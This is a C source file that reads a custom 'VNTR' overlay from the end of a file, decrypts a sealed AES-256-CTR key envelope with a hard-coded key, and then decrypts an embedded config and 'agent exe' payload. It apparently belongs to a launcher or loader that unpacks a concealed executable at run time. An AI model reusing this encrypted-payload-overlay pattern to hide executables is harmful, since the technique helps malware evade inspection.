/*
 * overlay.c — LOCKED VNTR overlay reader + AES-256-CTR decrypt.
 *
 * Layout (see docs/launcher-integration-spec.md and template.cs), byte-kept:
 *   [hdr 24B]   "VNTR" ver=1 flags(1) rsv(2) envLen=65 cfgLen u32 payLen u32 rsv
 *   [env 65B]   AES-256-CTR(seal, K_B(32)||IV_PAY(16)||IV_CFG(16)||CK(1))
 *               CK = xor of bytes 0..63 of the envelope plaintext
 *   [cfg …]     AES-256-CTR(K_B, IV_CFG)  of the percent-encoded config
 *   [pay …]     AES-256-CTR(K_B, IV_PAY)  of the agent exe
 *   [trc 12B]   cfgLen u32 | payLen u32 | "VNTZ"
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "common.h"
#include "aes256.h"
#include "seal.h"

static uint32_t read_u32le(const uint8_t *b, int off) {
    return ((uint32_t)b[off])
         | ((uint32_t)b[off + 1] << 8)
         | ((uint32_t)b[off + 2] << 16)
         | ((uint32_t)b[off + 3] << 24);
}

int read_file(const char *path, uint8_t **out, size_t *n) {
    FILE *f = fopen(path, "rb");
    if (!f) return 0;
    if (fseek(f, 0, SEEK_END) != 0) { fclose(f); return 0; }
    long sz = ftell(f);
    if (sz < 0) { fclose(f); return 0; }
    if (fseek(f, 0, SEEK_SET) != 0) { fclose(f); return 0; }
    uint8_t *buf = (uint8_t *)malloc((size_t)sz + 16);
    if (!buf) { fclose(f); return 0; }
    size_t got = 0, wanted = (size_t)sz;
    while (got < wanted) {
        size_t r = fread(buf + got, 1, wanted - got, f);
        if (r == 0) break;
        got += r;
    }
    fclose(f);
    if (got != wanted) { free(buf); return 0; }
    *out = buf;
    *n = got;
    return 1;
}

int write_file(const char *path, const uint8_t *data, size_t n) {
    FILE *f = fopen(path, "wb");
    if (!f) return 0;
    size_t off = 0;
    while (off < n) {
        size_t w = fwrite(data + off, 1, n - off, f);
        if (w == 0) { fclose(f); return 0; }
        off += w;
    }
    return fclose(f) == 0;
}

static int hex_val(int c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return 0;
}

static uint8_t *hex_decode(const char *s, size_t *n) {
    size_t len = strlen(s) / 2;
    uint8_t *res = (uint8_t *)malloc(len + 1);
    if (!res) return NULL;
    for (size_t i = 0; i < len; i++) {
        res[i] = (uint8_t)((hex_val(s[i * 2]) << 4) | hex_val(s[i * 2 + 1]));
    }
    *n = len;
    return res;
}

int overlay_parse(const uint8_t *buf, size_t n, Overlay *ov) {
    if (n < (size_t)(HDR_LEN + ENV_LEN + 16)) return 0;
    size_t tail = n - 4;
    if (buf[tail] != 'V' || buf[tail + 1] != 'N' ||
        buf[tail + 2] != 'T' || buf[tail + 3] != 'Z') return 0;
    uint32_t cfgLen = read_u32le(buf, (int)(n - 12));
    uint32_t payLen = read_u32le(buf, (int)(n - 8));
    if (cfgLen == 0 || payLen == 0 || cfgLen > MAX_CFG || payLen > MAX_PAY) return 0;
    size_t ovLen = (size_t)HDR_LEN + ENV_LEN + cfgLen + payLen;
    if (n < ovLen + 12) return 0;
    size_t off = n - ovLen - 12;
    if (buf[off] != 'V' || buf[off + 1] != 'N' || buf[off + 2] != 'T' || buf[off + 3] != 'R') return 0;
    if (buf[off + 4] != 1) return 0;
    if (read_u32le(buf, (int)(off + 8)) != ENV_LEN ||
        read_u32le(buf, (int)(off + 12)) != cfgLen ||
        read_u32le(buf, (int)(off + 16)) != payLen) return 0;

    ov->flags = buf[off + 5] & 0xff;

    size_t klen = 0, ilen = 0;
    uint8_t *skey = hex_decode(SEAL_KEY_64, &klen);
    uint8_t *siv = hex_decode(SEAL_IV_32, &ilen);
    if (!skey || !siv || klen != 32 || ilen != 16) {
        if (skey) free(skey);
        if (siv) free(siv);
        return 0;
    }

    uint8_t env[ENV_LEN];
    memcpy(env, &buf[off + HDR_LEN], ENV_LEN);
    aes256_ctr_xor(skey, siv, env, ENV_LEN);
    free(skey);
    free(siv);
    int ck = 0;
    for (int i = 0; i < 64; i++) ck ^= env[i];
    if (ck != (env[64] & 0xff)) return 0;

    uint8_t kb[32], ivPay[16], ivCfg[16];
    memcpy(kb, env, 32);
    memcpy(ivPay, env + 32, 16);
    memcpy(ivCfg, env + 48, 16);

    char *cfg = (char *)malloc((size_t)cfgLen + 1);
    if (!cfg) return 0;
    memcpy(cfg, &buf[off + HDR_LEN + ENV_LEN], cfgLen);
    aes256_ctr_xor(kb, ivCfg, (uint8_t *)cfg, cfgLen);
    cfg[cfgLen] = 0;

    uint8_t *pay = (uint8_t *)malloc(payLen);
    if (!pay) { free(cfg); return 0; }
    memcpy(pay, &buf[off + HDR_LEN + ENV_LEN + cfgLen], payLen);
    aes256_ctr_xor(kb, ivPay, pay, payLen);

    ov->config = cfg;
    ov->payload = pay;
    ov->payload_len = payLen;
    return 1;
}